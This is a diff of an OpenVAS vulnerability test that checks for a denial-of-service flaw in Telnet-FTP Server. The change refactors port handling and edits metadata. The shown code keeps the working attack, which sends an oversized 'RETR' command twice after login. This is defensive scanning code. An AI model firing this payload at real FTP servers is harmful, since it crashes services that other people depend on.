@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_telnet_ftp_server_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: secpod_telnet_ftp_server_dos_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # Telnet-FTP Server 'RETR' Command Remote Denial of Service Vulnerability
 #
@@ -27,10 +27,10 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902819");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-21 16:16:16 +0530 (Wed, 21 Mar 2012)");
   script_name("Telnet-FTP Server 'RETR' Command Remote Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
@@ -60,24 +60,14 @@ General solution options are to upgrade to a newer release, disable respective f
   exit(0);
 }
 
-
 include("ftp_func.inc");
 
-ftpPort = get_kb_item("Services/ftp");
-if(! ftpPort){
-  ftpPort = 21;
-}
-
-if(! get_port_state(ftpPort)){
-  exit(0);
-}
-
+ftpPort = get_ftp_port(default:21);
 banner = get_ftp_banner(port:ftpPort);
 if(! banner || "Telnet-Ftp Server" >!< banner){
   exit(0);
 }
 
-## Open FTP Socket
 soc = open_sock_tcp(ftpPort);
 if(! soc){
   exit(0);
@@ -88,7 +78,7 @@ pass = get_kb_item("ftp/password");
 
 if(! user){
   user = "anonymous";
-  pass = "openvas@";
+  pass = "user@";
 }
 
 login_details = ftp_log_in(socket:soc, user:user, pass:pass);
@@ -98,7 +88,6 @@ if(! login_details){
 
 exploit = "RETR " + crap(256);
 
-## Send the Attack Request
 ftp_send_cmd(socket:soc, cmd:exploit);
 ftp_send_cmd(socket:soc, cmd:exploit);
 ftp_close(socket:soc);
